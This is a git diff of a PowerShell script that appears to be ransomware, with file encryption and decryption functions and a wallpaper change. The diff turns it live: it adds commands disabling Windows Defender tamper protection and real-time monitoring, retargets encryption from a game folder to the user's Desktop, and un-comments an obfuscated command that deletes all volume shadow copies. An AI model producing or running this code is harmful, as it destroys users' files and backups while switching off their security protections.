@@ -101,8 +101,6 @@ function Decrypt-File {
         Write-Error "File decryption failed: $($_.Exception.Message)"
     }
 }
-# Function to call file encryption and overwrite old file
-
 function main{
     param (
         [Parameter(Mandatory=$true)]
@@ -131,11 +129,12 @@ function main{
     Set-ItemProperty -Path "HKCU:\Control Panel\Desktop\" -Name "WallPaper" -Value "$env:USERPROFILE\Downloads\Wallpaper.jpg"
 }
 
-
-$path = 'C:\Program Files (x86)\Steam\steamapps\common\WW1GameSeries\Verdun'
+Set-MPPreference -DisableTamperProtection $true
+Set-MpPreference -DisableRealtimeMonitoring $true
+$path = "$env:USERPROFILE\Desktop"
 $AS = "vssadmi"
 $AZ = "n.exe delete shadows /all /quiet"
 $AD = $AS + $AZ
-#Invoke-Expression $AD
+Invoke-Expression $AD
 main -TargetDirectory $path -EncKey 123 
 Rundll32.exe user32.dll,UpdatePerUserSystemParameters
